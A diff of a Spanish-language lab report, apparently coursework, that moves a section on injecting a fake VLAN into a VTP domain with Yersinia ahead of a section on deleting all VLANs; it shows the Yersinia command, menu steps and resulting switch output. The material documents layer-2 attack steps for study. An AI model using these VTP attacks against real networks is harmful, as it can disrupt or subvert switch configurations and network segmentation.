@@ -78,7 +78,35 @@ sudo apt update && sudo apt install -y yersinia
 
 ---
 
-## Ataque 1 — Borrar todas las VLANs
+
+## Ataque — Agregar una VLAN
+
+### Objetivo
+Inyectar una VLAN falsa en el dominio VTP desde la máquina atacante.
+
+### Ejecución desde Yersinia modo interactivo
+
+```bash
+sudo yersinia -I
+```
+
+Dentro de Yersinia: F2 → VTP mode → a → agregar VLAN
+
+### Estado después del ataque
+
+![Imagen 7 - VLAN 80 ITLA agregada por el ataque](imagen7_vlan_agregada.png)
+
+```
+SW1# show vlan brief
+VLAN  Name     Status
+1     default  active
+80    ITLA     active   ← VLAN agregada por el atacante ✓
+```
+
+**Resultado:** La VLAN 80 "ITLA" fue agregada exitosamente en SW1 por el atacante.
+
+
+## Ataque — Borrar todas las VLANs
 
 ### Objetivo
 Eliminar todas las VLANs definidas por el usuario en SW1 y SW2 enviando un anuncio VTP con número de revisión superior y base de datos vacía.
@@ -124,31 +152,7 @@ VLAN  Name     Status
 
 ---
 
-## Ataque 2 — Agregar una VLAN
 
-### Objetivo
-Inyectar una VLAN falsa en el dominio VTP desde la máquina atacante.
-
-### Ejecución desde Yersinia modo interactivo
-
-```bash
-sudo yersinia -I
-```
-
-Dentro de Yersinia: F2 → VTP mode → a → agregar VLAN
-
-### Estado después del ataque
-
-![Imagen 7 - VLAN 80 ITLA agregada por el ataque](imagen7_vlan_agregada.png)
-
-```
-SW1# show vlan brief
-VLAN  Name     Status
-1     default  active
-80    ITLA     active   ← VLAN agregada por el atacante ✓
-```
-
-**Resultado:** La VLAN 80 "ITLA" fue agregada exitosamente en SW1 por el atacante.
 
 ---
 
